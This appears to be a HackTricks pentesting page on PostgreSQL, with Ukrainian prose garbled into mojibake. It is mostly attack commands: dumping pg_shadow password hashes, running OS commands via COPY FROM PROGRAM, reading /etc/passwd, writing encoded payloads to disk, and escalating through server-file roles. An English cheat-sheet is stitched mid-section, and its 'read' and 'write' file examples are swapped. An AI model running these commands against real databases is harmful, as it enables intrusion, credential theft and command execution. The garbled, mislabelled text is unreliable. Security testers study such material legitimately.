# 5432,5433 - –í–µ–Ω—Ç–µ—Å—Ç—ñ–Ω–≥ PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) –¥–ª—è –ª–µ–≥–∫–æ—ó –ø–æ–±—É–¥–æ–≤–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤**, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —É —Å–ø—ñ–ª—å–Ω–æ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF-—Ñ–æ—Ä–º–∞—Ç—ñ**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

**PostgreSQL** –æ–ø–∏—Å—É—î—Ç—å—Å—è —è–∫ **–æ–±'—î–∫—Ç–Ω–æ-—Ä–µ–ª—è—Ü—ñ–π–Ω–∞ —Å–∏—Å—Ç–µ–º–∞ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –±–∞–∑–∞–º–∏ –¥–∞–Ω–∏—Ö**, —è–∫–∞ —î **–≤—ñ–¥–∫—Ä–∏—Ç–∏–º –¥–∂–µ—Ä–µ–ª–æ–º**. –¶—è —Å–∏—Å—Ç–µ–º–∞ –Ω–µ –ª–∏—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–æ–≤—É SQL, –∞–ª–µ –π —Ä–æ–∑—à–∏—Ä—é—î —ó—ó –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏. –á—ó –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –æ–±—Ä–æ–±–ª—è—Ç–∏ —à–∏—Ä–æ–∫–∏–π —Å–ø–µ–∫—Ç—Ä —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö —Ç–∞ –æ–ø–µ—Ä–∞—Ü—ñ–π, —â–æ —Ä–æ–±–∏—Ç—å —ó—ó —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–º –≤–∏–±–æ—Ä–æ–º –¥–ª—è —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ —Ç–∞ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 5432, —ñ —è–∫—â–æ —Ü–µ–π –ø–æ—Ä—Ç –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, –∑–¥–∞—î—Ç—å—Å—è, —â–æ postgresql –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø–æ—Ä—Ç (—ñ–º–æ–≤—ñ—Ä–Ω–æ, 5433), —è–∫–∏–π –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –û—Å–Ω–æ–≤–Ω–∏–π –ø–µ—Ä–µ–ª—ñ–∫
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
–Ø–∫—â–æ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **`\list`** –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ –±–∞–∑—É –¥–∞–Ω–∏—Ö –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`rdsadmin`**, –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö **AWS postgresql**.
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ **—è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –±–∞–∑–æ—é –¥–∞–Ω–∏—Ö PostgreSQL**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ–ª—ñ—á–µ–Ω–Ω—è
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **–°–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤**

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º**](https://www.exploit-db.com/papers/13084), –∫–æ–ª–∏ —Å–ø—Ä–æ–±–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –Ω–µ –≤–¥–∞—î—Ç—å—Å—è, `dblink` –≤–∏–∫–∏–¥–∞—î –≤–∏–Ω—è—Ç–æ–∫ `sqlclient_unable_to_establish_sqlconnection`, –≤–∫–ª—é—á–∞—é—á–∏ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ü–∏—Ö –¥–µ—Ç–∞–ª–µ–π.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* –•–æ—Å—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π

`–î–ï–¢–ê–õ–Ü: –Ω–µ –≤–¥–∞–ª–æ—Å—è –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ —Å–µ—Ä–≤–µ—Ä–∞: –ù–µ–º–∞—î –º–∞—Ä—à—Ä—É—Ç—É –¥–æ —Ö–æ—Å—Ç–∞. –ß–∏ –ø—Ä–∞—Ü—é—î —Å–µ—Ä–≤–µ—Ä –Ω–∞ —Ö–æ—Å—Ç—ñ "1.2.3.4" —ñ –ø—Ä–∏–π–º–∞—î TCP/IP –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É 5678?`

* –ü–æ—Ä—Ç –∑–∞–∫—Ä–∏—Ç–∏–π
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* –ü–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```plaintext
### PostgreSQL

#### Connect to PostgreSQL
```bash
psql -h <IP> -U <USER> -d <DATABASE>
```

#### List databases
```sql
\l
```

#### List tables
```sql
\dt
```

#### Show table structure
```sql
\dt+ <TABLE>
```

#### Execute SQL query
```sql
SELECT * FROM <TABLE>;
```

#### Execute system commands
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

#### Write files
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM '/etc/passwd';
SELECT * FROM cmd_exec;
```

#### Read files
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec TO '/tmp/file_to_write' WITH (FORMAT csv, HEADER false);
```

#### Enable additional modules
```sql
CREATE LANGUAGE plpythonu;
CREATE FUNCTION plpython_call_handler() RETURNS language_handler AS '$libdir/plpython2', 'plpython_call_handler' LANGUAGE C;
CREATE TRUSTED LANGUAGE plpythonu HANDLER plpython_call_handler;
```
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* –ü–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∞–±–æ —Ñ—ñ–ª—å—Ç—Ä—É—î—Ç—å—Å—è
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
–£ —Ñ—É–Ω–∫—Ü—ñ—è—Ö PL/pgSQL –Ω–∞—Ä–∞–∑—ñ –Ω–µ–º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—Ç–∞–ª—ñ –≤–∏–Ω—è—Ç–∫—ñ–≤. –û–¥–Ω–∞–∫, —è–∫—â–æ —É –≤–∞—Å —î –ø—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –Ø–∫—â–æ –≤–∏–¥–æ–±—É–≤–∞–Ω–Ω—è —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ–≤ –∑ —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —Ç–∞–±–ª–∏—Ü—å –Ω–µ —î –º–æ–∂–ª–∏–≤–∏–º, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑–≥–ª—è–Ω—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ç–æ–¥—É –∞—Ç–∞–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–ª–æ–≤–Ω–∏–∫–∞, —è–∫–∏–π –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ–∑–∏—Ç–∏–≤–Ω–∏—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤.

## –ü–µ—Ä–µ–ª—ñ–∫ –ü—Ä–∏–≤—ñ–ª–µ—ó–≤

### –†–æ–ª—ñ

| –¢–∏–ø–∏ –†–æ–ª–µ–π    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | –†–æ–ª—å –º–∞—î –ø—Ä–∏–≤—ñ–ª–µ—ó —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞                                                                                                                 |
| rolinherit     | –†–æ–ª—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —É—Å–ø–∞–¥–∫–æ–≤—É—î –ø—Ä–∏–≤—ñ–ª–µ—ó —Ä–æ–ª–µ–π, –¥–æ —è–∫–∏—Ö –≤–æ–Ω–∞ –Ω–∞–ª–µ–∂–∏—Ç—å                                                                                   |
| rolcreaterole  | –†–æ–ª—å –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —ñ–Ω—à—ñ —Ä–æ–ª—ñ                                                                                                                      |
| rolcreatedb    | –†–æ–ª—å –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö                                                                                                                      |
| rolcanlogin    | –†–æ–ª—å –º–æ–∂–µ —É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Ü—é —Ä–æ–ª—å –º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏ —è–∫ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó —Å–µ–∞–Ω—Å—É                                |
| rolreplication | –†–æ–ª—å —î —Ä–æ–ª—å—é —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –†–æ–ª—å —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó –º–æ–∂–µ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ –≤–∏–¥–∞–ª—è—Ç–∏ —Å–ª–æ—Ç–∏ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó.                   |
| rolconnlimit   | –î–ª—è —Ä–æ–ª–µ–π, —è–∫—ñ –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É, —Ü–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –æ–¥–Ω–æ—á–∞—Å–Ω–∏—Ö –∑'—î–¥–Ω–∞–Ω—å, —è–∫—ñ –º–æ–∂–µ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ —Ü—è —Ä–æ–ª—å. -1 –æ–∑–Ω–∞—á–∞—î –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –æ–±–º–µ–∂–µ–Ω–Ω—è. |
| rolpassword    | –ù–µ –ø–∞—Ä–æ–ª—å (–∑–∞–≤–∂–¥–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è —è–∫ `********`)                                                                                                      |
| rolvaliduntil  | –ß–∞—Å –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó –ø–∞—Ä–æ–ª—è (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –ø–∞—Ä–æ–ª–µ–º); null, —è–∫—â–æ —Ç–µ—Ä–º—ñ–Ω –¥—ñ—ó –Ω–µ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è                  |
| rolbypassrls   | –†–æ–ª—å –æ–±—Ö–æ–¥–∏—Ç—å –∫–æ–∂–Ω—É –ø–æ–ª—ñ—Ç–∏–∫—É –±–µ–∑–ø–µ–∫–∏ –Ω–∞ —Ä—ñ–≤–Ω—ñ —Ä—è–¥–∫–∞, –¥–∏–≤. [–†–æ–∑–¥—ñ–ª 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó. |
| rolconfig      | –†–æ–ª—å–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è –∑–º—ñ–Ω–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è                                                                            |
| oid            | ID —Ä–æ–ª—ñ                                                                                                                                             |

#### –¶—ñ–∫–∞–≤—ñ –ì—Ä—É–ø–∏

* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_execute_server_program`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏** –ø—Ä–æ–≥—Ä–∞–º–∏
* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_read_server_files`**, –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏** —Ñ–∞–π–ª–∏
* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_write_server_files`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–∏—Å–∞—Ç–∏** —Ñ–∞–π–ª–∏

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ Postgres **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á**, **–≥—Ä—É–ø–∞** —Ç–∞ **—Ä–æ–ª—å** - —Ü–µ **—Ç–µ–∂ —Å–∞–º–µ**. –¶–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, **—è–∫ –≤–∏ —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ** —Ç–∞ —á–∏ **–¥–æ–∑–≤–æ–ª—è—î—Ç–µ –≤—Ö—ñ–¥**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### –¢–∞–±–ª–∏—Ü—ñ
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### –§—É–Ω–∫—Ü—ñ—ó
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## –î—ñ—ó –∑ —Ñ–∞–π–ª–æ–≤–æ—é —Å–∏—Å—Ç–µ–º–æ—é

### –ß–∏—Ç–∞–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —Ç–∞ —Ñ–∞–π–ª—ñ–≤

–ó —Ü—å–æ–≥–æ [**–∫–æ–º—ñ—Ç—É**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) —á–ª–µ–Ω–∏ –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó –≥—Ä—É–ø–∏ **`DEFAULT_ROLE_READ_SERVER_FILES`** (–∑–≤–∞–Ω–æ—ó **`pg_read_server_files`**) —Ç–∞ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥ **`COPY`** –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ —à–ª—è—Ö—É (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ `convert_and_check_filename` –≤ `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –¥–æ–∑–≤—ñ–ª **CREATEROLE**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏:**
```sql
GRANT pg_read_server_files TO username;
```
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

–Ñ **—ñ–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó postgres**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **—á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—É –∞–±–æ –ø–µ—Ä–µ–ª—ñ–∫—É –∫–∞—Ç–∞–ª–æ–≥—É**. –á—Ö –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ª–∏—à–µ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ —è–≤–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏**:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–±—ñ–ª—å—à–µ —Ñ—É–Ω–∫—Ü—ñ–π** –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### –ü—Ä–æ—Å—Ç–µ –ó–∞–ø–∏—Å—É–≤–∞–Ω–Ω—è –§–∞–π–ª—ñ–≤

–¢—ñ–ª—å–∫–∏ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ —á–ª–µ–Ω–∏ **`pg_write_server_files`** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ copy –¥–ª—è –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—ñ–≤.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –¥–æ–∑–≤—ñ–ª **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏:**
```sql
GRANT pg_write_server_files TO username;
```
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

